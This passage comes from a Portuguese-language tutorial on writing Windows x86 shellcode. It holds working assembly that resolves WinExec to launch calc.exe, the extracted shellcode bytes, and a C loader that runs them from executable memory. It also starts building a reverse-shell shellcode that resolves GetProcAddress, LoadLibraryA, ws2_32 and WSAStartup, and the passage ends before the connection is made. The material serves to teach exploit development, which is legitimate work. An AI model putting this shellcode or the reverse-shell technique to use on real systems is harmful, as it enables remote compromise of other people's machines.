    <span class="nf">add</span> <span class="nb">ebx</span><span class="p">,</span> <span class="mi">1</span>              <span class="c1">;aplicando a correção no contador de ebx</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="nb">ebx</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="c1">;corrigindo o valor de edi</span>
    <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">edi</span>            <span class="c1">;;#adicione o endereço base do kerneldll32 ao endereço acima para obter o endereço WinExec</span>
</pre></table></code></div></div><p>Ao executarmos no <code class="language-plaintext highlighter-rouge">x32dbg</code> veremos que o endereço da função <code class="language-plaintext highlighter-rouge">WinExec</code> agora está armazenada no registrador <code class="language-plaintext highlighter-rouge">eax</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718191159.png" alt="" /></p><p>Uma vez que temos o endereço da <code class="language-plaintext highlighter-rouge">WinExec</code> armazenado em um registrador, o que precisamos é enviar seus argumentos para a <em>stack</em> e fazer a chamada. O último trecho de código fica:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nl">callcalc:</span>

    <span class="nf">push</span> <span class="nb">ecx</span>            <span class="c1">;String terminator 0x00 para "calc.exe"</span>
    <span class="nf">push</span> <span class="mh">0x6578652e</span>     <span class="c1">;exe.</span>
    <span class="nf">push</span> <span class="mh">0x636c6163</span>     <span class="c1">;clac</span>

    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>        <span class="c1">;salvando o ponteiro para a string "calc.exe" em ebx</span>

    <span class="c1">; UINT WinExec([in] LPCSTR lpCmdLine, [in] UINT   uCmdShow);</span>
    <span class="nf">inc</span>  <span class="nb">ecx</span>            <span class="c1">;uCmdShow = 1</span>
    <span class="nf">push</span> <span class="nb">ecx</span>            <span class="c1">;uCmdShow *ptr para stack na posição 2 - LIFO</span>
    <span class="nf">push</span> <span class="nb">ebx</span>            <span class="c1">;lpcmdLine *ptr para stack na posição 1</span>
    <span class="nf">call</span> <span class="nb">eax</span>            <span class="c1">;invocando WinExec de eax</span>
</pre></table></code></div></div><p>Agora podemos compilar o programa no próprio Linux:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nasm <span class="nt">-f</span> elf shellcodecalc.asm
<span class="nv">$ </span>ld <span class="nt">-m</span> elf_i386 <span class="nt">-o</span> shellcodecalc shellcodecalc.o
<span class="nv">$ </span>objdump <span class="nt">-M</span> intel <span class="nt">-d</span> shellcodecalc
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718194453.png" alt="" /></p><p>Utilizando o mesmo <em>oneliner</em> de antes, obtemos a <em>string</em> com o <em>shellcode</em>:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>objdump <span class="nt">-d</span> shellcodecalc | <span class="nb">grep</span> <span class="s1">'^ '</span> | <span class="nb">cut</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span><span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'\x'</span><span class="nv">$i</span><span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="nb">echo</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718194527.png" alt="" /></p><p>Inserindo o <em>shellcode</em> no programa de teste, temos o seguinte resultado:</p><div lang="c" class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">"</span><span class="se">\x31\xc0\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x14\x8b\x00\x8b\x00\x8b\x40\x10\x31\xd2\x68\x78\x65\x63\x4e\x66\x83\x6c\x24\x03\x4e\x68\x57\x69\x6e\x45\x8b\x50\x3c\x01\xc2\x8b\x52\x78\x01\xc2\x8b\x4a\x20\x01\xc1\x89\x4d\xfc\x8b\x52\x1c\x01\xc2\x31\xdb\x31\xc9\x89\xe6\x8b\x7d\xfc\x8b\x3c\x9f\x01\xc7\x66\x83\xc1\x04\xf3\x66\xa7\x74\x03\x43\xe2\xe8\x83\xc3\x01\x8b\x3c\x9a\x01\xf8\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0</span><span class="s">"</span><span class="p">;</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">exec_mem</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Falha na alocação de memória.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>

    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec_mem</span><span class="p">;</span>
    <span class="n">func</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>E podemos compilá-lo:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>i686-w64-mingw32-gcc winshelltest.c <span class="nt">-o</span> winshelltest.exe
</pre></table></code></div></div><p>Ao executarmos o programa, o <em>shellcode</em> é ativado, abrindo a calculadora.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240718194850.png" alt="" /></p><h3 id="desenvolvendo-o-shellcode-exemplo-2---reverse-shell">Desenvolvendo o <em>shellcode</em>, Exemplo 2 - Reverse Shell</h3><p>Este exemplo se encaixa muito bem no cenário de exploração, talvez não da forma crua que o exemplo explorará, mas em seu ponto mais primitivo. Injetar um <em>shellcode</em> para obter acesso remoto, é, na maioria das vezes, o objetivo principal de um <em>exploit</em>.</p><p>Para atingirmos esta finalidade, basicamente será necessário unir vários passos abordados até o momento deste artigo, pois além da descoberta de endereços-base de bibliotecas como a <code class="language-plaintext highlighter-rouge">kernel32.dll</code>, á preciso carregar outras DLLs que não são carregadas normalmente como a <code class="language-plaintext highlighter-rouge">ws2_32.dll</code> responsável por criar conexões <em>socket</em>. Sumarizando os passos, é preciso:</p><ol><li>Encontrar o endereço da <code class="language-plaintext highlighter-rouge">kernel32.dll</code> e armazená-lo em algum lugar para uso recorrente;<li>Encontrar o endereço da função <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> e armazená-lo em algum lugar para uso recorrente;<li>Encontrar o endereço da função <code class="language-plaintext highlighter-rouge">LoadLibrary()</code>;<li>Utilizando a função <code class="language-plaintext highlighter-rouge">LoadLibrary()</code> carregaremos a biblioteca <code class="language-plaintext highlighter-rouge">ws2_32.dll</code> e armazenaremos seu endereço em algum lugar para uso recorrente;<li>Utilizar a função <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> na <code class="language-plaintext highlighter-rouge">ws2_32.dll</code> para encontrar o endereço da função <code class="language-plaintext highlighter-rouge">WSAStartup()</code>;<li>Utilizar a função <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> na <code class="language-plaintext highlighter-rouge">ws2_32.dll</code> para encontrar o endereço da função <code class="language-plaintext highlighter-rouge">WSASocketA()</code>;<li>Utilizar a função <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> na <code class="language-plaintext highlighter-rouge">ws2_32.dll</code> para encontrar o endereço da função <code class="language-plaintext highlighter-rouge">Connect()</code>;<li>Encontrar o endereço da função <code class="language-plaintext highlighter-rouge">CreateProcessA()</code> utilizando <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> e o endereço da <code class="language-plaintext highlighter-rouge">kernel32.dll</code>;<li>Chamar o processo <code class="language-plaintext highlighter-rouge">cmd.exe</code> no <em>socket</em> aberto com a função <code class="language-plaintext highlighter-rouge">Connect()</code> utilizando a <code class="language-plaintext highlighter-rouge">CreateProcessA()</code>;<li>Chamar a função <code class="language-plaintext highlighter-rouge">ExitProcess()</code> utilizando <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> e o endereço da <code class="language-plaintext highlighter-rouge">kernel32.dll</code>.</ol><p>Algumas considerações devem ser consideradas na construção deste <em>shellcode</em>: muitas funções de APIs do Windows, automaticamente armazenam suas respostas no registrador <code class="language-plaintext highlighter-rouge">EAX</code>, isso significa que devemos evitá-lo para armazenar endereços e ponteiros que tem uso recorrente.</p><p>Um exemplo, é a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup">WSAStartup</a>, que se obtiver sucesso em sua execução, retornará zero no registrador <code class="language-plaintext highlighter-rouge">EAX</code>.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">WSAStartup</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">WORD</span>      <span class="n">wVersionRequired</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">LPWSADATA</span> <span class="n">lpWSAData</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Já a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa">WSASocketA</a> tem um funcionamento similar à <em>syscall socket</em> no Linux.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">SOCKET</span> <span class="n">WSAAPI</span> <span class="nf">WSASocketA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="kt">int</span>                 <span class="n">af</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="kt">int</span>                 <span class="n">type</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="kt">int</span>                 <span class="n">protocol</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">LPWSAPROTOCOL_INFOA</span> <span class="n">lpProtocolInfo</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">GROUP</span>               <span class="n">g</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span>               <span class="n">dwFlags</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Esta função precisa de todos os argumentos, portanto é preciso enviá-los em ordem inversa para a <em>stack</em> antes de chamá-la. <strong>Lendo o manual</strong> temos os seguintes argumentos:</p><ul><li>dwFlags=NULL<li>g=NULL<li>lpProtocolInfo=NULL<li>o protocolo precisa ser IPPROTO_TCP portanto=6<li>o tipo precisa ser SOCK_STREAM portanto=1<li>a família de endereço precisa ser AF_INET portanto=2</ul><p>A função <a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect">Connect</a> estabelece uma conexão com o <em>socket</em> especificado.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="n">WSAAPI</span> <span class="nf">connect</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">SOCKET</span>         <span class="n">s</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="k">const</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="kt">int</span>            <span class="n">namelen</span>
<span class="p">);</span>
</pre></table></code></div></div><h4 id="o-shellcode">O <em>shellcode</em></h4><p>Inicialmente, utilizaremos boa parte da base do exemplo anterior, porém, ao invés de procurarmos pela função <code class="language-plaintext highlighter-rouge">WinExec()</code>, procuraremos pela <code class="language-plaintext highlighter-rouge">GetrProcAddress()</code> com o cuidado para não armazenarmos nada em <code class="language-plaintext highlighter-rouge">EAX</code> desta vez:</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

<span class="nl">getKernel32:</span>

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">;zerando o registrador</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">fs</span><span class="p">:</span><span class="mh">0x30</span><span class="p">]</span>      <span class="c1">;movendo o offset da PEB de fs (File Segment) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x0c</span><span class="p">]</span>   <span class="c1">;movendo o offset da LDR (PEB + 0x00c) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">]</span>   <span class="c1">;movendo o offset da InMemoryOrderModuleList (LDR + 0x014) para eax</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>          <span class="c1">;carregando o endereço efetivo do primeiro modulo - o executavel em si</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>          <span class="c1">;carregando o endereço efetivo do segundo modulo - ntdll.dll</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>   <span class="c1">;carregando o endereço base do terceiro modulo - kernel32.dll</span>

<span class="nl">getProcAddress:</span>

    <span class="c1">;enviando nome da função para stack</span>
    <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>                <span class="c1">;zerando o registrador</span>
    <span class="nf">push</span> <span class="mh">0x4e4e7373</span>             <span class="c1">;movendo NNss para stack</span>
    <span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
    <span class="nf">push</span> <span class="mh">0x65726464</span>             <span class="c1">;movendo erdd para stack</span>
    <span class="nf">push</span> <span class="mh">0x41636f72</span>             <span class="c1">;movendo Acor para stack</span>
    <span class="nf">push</span> <span class="mh">0x50746547</span>             <span class="c1">;movendo PteG para stack</span>
    <span class="c1">;encontrando o endereço da Export Table e armazenando em edx</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">]</span>       <span class="c1">;conteudo de 0x3c é f8 e foi movido para edx</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>                <span class="c1">;adicionado o endereço base da kernel32 a f8</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">]</span>       <span class="c1">;adicionado 0x78 (170 - f8) para obter o RVA de Image Export Directory</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Image Export Directory</span>
    <span class="c1">;encontrando o endereço da Export Name Pointer table e armazenando em ecx</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span>       <span class="c1">;adicionadno 0x20 para obter o RVA da Export Name Pointer Table</span>
    <span class="nf">add</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebx</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Export Name Pointer Table</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">],</span> <span class="nb">ecx</span>            <span class="c1">;movendo o endereço base de Export Name Pointer Table para a variavel [ebp-4]</span>
    <span class="c1">;encontrando o endereço de Export Address table e armazenando em edx</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="p">]</span>       <span class="c1">;adicionando 0x1c para obter o RVA da Export Address Table</span>
    <span class="nf">add</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">ebx</span>                <span class="c1">;adicionado o endereço base da kernel32 para obter o endereço base de Export Address Table</span>

<span class="c1">;encontrando o endereço da GetrProcAddress na kernel32.dll com loop</span>
        <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>                    <span class="c1">;zerando o registrador para uso no loop</span>
<span class="nl">findproc:</span>

    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>            <span class="c1">;zerando o registrador para ser usado em comparações de string</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esp</span>            <span class="c1">;movendo GetrProcAddress da stack para esi</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>        <span class="c1">;movendo o endereço base da Export Name Pointer Table para edi</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">edi</span> <span class="o">+</span> <span class="nb">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="c1">;endereço base da Export Name Pointer Table + valor ordinal * 4, edi = RVA do função buscada pelo nome</span>
    <span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">;adicionando o endereço base da kernel32 ao RVA da função</span>
    <span class="nf">add</span> <span class="nb">cx</span><span class="p">,</span> <span class="mi">7</span>               <span class="c1">;movendo o comprimento da string GetrProcAddress para cx: GetProcAddress = 14 bytes = 7 WORD</span>
    <span class="nf">repe</span> <span class="nv">cmpsw</span>              <span class="c1">;compara o numero de WORDS no registrador cx da esquerda para direita com edi e esi, armazena a saída na flag ZF</span>
    <span class="nf">jz</span> <span class="nv">findaddr</span>             <span class="c1">;pula para findaddr e quebra o loop se a flag ZE for TRUE</span>
    <span class="nf">inc</span> <span class="nb">eax</span>                 <span class="c1">;incrementa o contador que contém o ordinal</span>
    <span class="nf">loop</span> <span class="nv">findproc</span>           <span class="c1">;loop no findproc</span>
<span class="nl">findaddr:</span>

    <span class="nf">add</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">2</span>              <span class="c1">;aplicando a correção no contador de ebx</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="nb">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="c1">;corrigindo o valor de edi</span>
    <span class="nf">add</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">ebx</span>            <span class="c1">;adicione o endereço base do kerneldll32 ao endereço acima para obter o endereço GetProcAddress</span>
    <span class="nf">mov</span> <span class="nb">ebp</span><span class="p">,</span> <span class="nb">edi</span>            <span class="c1">;carregando o endereço da GetProcAddress em ebp</span>
</pre></table></code></div></div><p>Se compilarmos o programa neste ponto e executarmos com o <code class="language-plaintext highlighter-rouge">x32dbg</code> veremos que, ao finalizar, temos o endereço base da <code class="language-plaintext highlighter-rouge">kernel32.dll</code> em <code class="language-plaintext highlighter-rouge">EBX</code> e o endereço da <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> em <code class="language-plaintext highlighter-rouge">EBP</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240722192027.png" alt="" /></p><p>A função <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> tem o seguinte formato:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">FARPROC</span> <span class="nf">GetProcAddress</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">LPCSTR</span>  <span class="n">lpProcName</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Que pode se resumir em:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">GetProcAddress</span><span class="p">(</span><span class="s">"biblioteca"</span><span class="p">,</span> <span class="s">"função"</span><span class="p">)</span>
</pre></table></code></div></div><p>Uma característica importante desta função, é o fato deu que o ponteiro para a função encontrada, é automaticamente carregado para <code class="language-plaintext highlighter-rouge">EAX</code> quando a função <code class="language-plaintext highlighter-rouge">GetProcAddress</code> tem sucesso.</p><p>Com as informações obtidas, podemos procurar a função <code class="language-plaintext highlighter-rouge">LoadLibraryA()</code> dentro da <code class="language-plaintext highlighter-rouge">kernel32.dll</code>.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nl">loadLibraryA:</span>

	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>    <span class="c1">;zerando o registrador</span>
	<span class="nf">push</span> <span class="nb">ecx</span>        <span class="c1">;enviando 0x0 como string terminator</span>
	<span class="nf">push</span> <span class="mh">0x41797261</span> <span class="c1">;enviando Ayra para stack</span>
	<span class="nf">push</span> <span class="mh">0x7262694c</span> <span class="c1">;enviando rbiL para Stack</span>
	<span class="nf">push</span> <span class="mh">0x64616f4c</span> <span class="c1">;enviando daoL para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>        <span class="c1">;enviando ponteiro da string para stack</span>
	<span class="nf">push</span> <span class="nb">ebx</span>        <span class="c1">;enviando ponteiro da kernel32.dll para stack</span>
	<span class="nf">call</span> <span class="nb">ebp</span>        <span class="c1">;chamando GetProcAddress("kernel32.dll", "LoadLibraryA")</span>
</pre></table></code></div></div><p>Neste ponto, ao executar o programa, temos o ponteiro para <code class="language-plaintext highlighter-rouge">LoadLibraryA()</code> em <code class="language-plaintext highlighter-rouge">EAX</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240722200401.png" alt="" /></p><p>Agora podemos carregar qualquer biblioteca que precisarmos, portanto, podemos agora encontrar o ponteiro para a <code class="language-plaintext highlighter-rouge">ws2_32.dll</code> e salvá-lo para encontrar todas as funções necessárias para a conexão <em>socket</em>.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nl">ws2_32:</span>

	<span class="nf">push</span> <span class="mh">0x4e4e3233</span>              <span class="c1">;movendo NN32 para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
	<span class="nf">push</span> <span class="mh">0x5f327377</span>              <span class="c1">;movendo _2sw para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                     <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">call</span> <span class="nb">eax</span>                     <span class="c1">;chamando LoadLibraryA(ws2_32)</span>
	<span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>                 <span class="c1">;salvando ponteiro para ws2_32 para uso recorrente</span>
</pre></table></code></div></div><p>Neste ponto, ao executar o programa, teremos o ponteiro para <code class="language-plaintext highlighter-rouge">ws2_32.dll</code> em <code class="language-plaintext highlighter-rouge">EAX</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240722203039.png" alt="" /></p><p>Estes são os pré-requisitos para montarmos e chamarmos todas as funções necessárias, portanto, seguindo o passo-a-passo listado, vamos encontrar o endereço da função <code class="language-plaintext highlighter-rouge">WSAStartup()</code>.</p><div lang="nasm" class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nl">WSAStartup:</span>

	<span class="nf">push</span> <span class="mh">0x4e4e7075</span>              <span class="c1">;movendo NNpu para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
	<span class="nf">push</span> <span class="mh">0x74726174</span>              <span class="c1">;movendo trat para stack</span>
	<span class="nf">push</span> <span class="mh">0x53415357</span>              <span class="c1">;movendo SASW para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                     <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">esi</span>                     <span class="c1">;movendo ponteiro da ws2_32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                     <span class="c1">;chamando GetProcAddress("ws2_32.dll", "WSAStartup")</span>
</pre></table></code></div></div><p>Neste ponto, temos o ponteiro para <code class="language-plaintext highlighter-rouge">WSAStartup()</code> em <code class="language-plaintext highlighter-rouge">EAX</code>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240722205443.png" alt="" /></p><p>Analisando o código de exemplo na <a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup">documentação</a> da <code class="language-plaintext highlighter-rouge">WSAStartup()</code>, podemos ver que ela pode assumir o formato:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">WSAStartup</span><span class="p">(</span><span class="n">MAKEWORD</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="n">wsadata_pointer</span><span class="p">)</span>
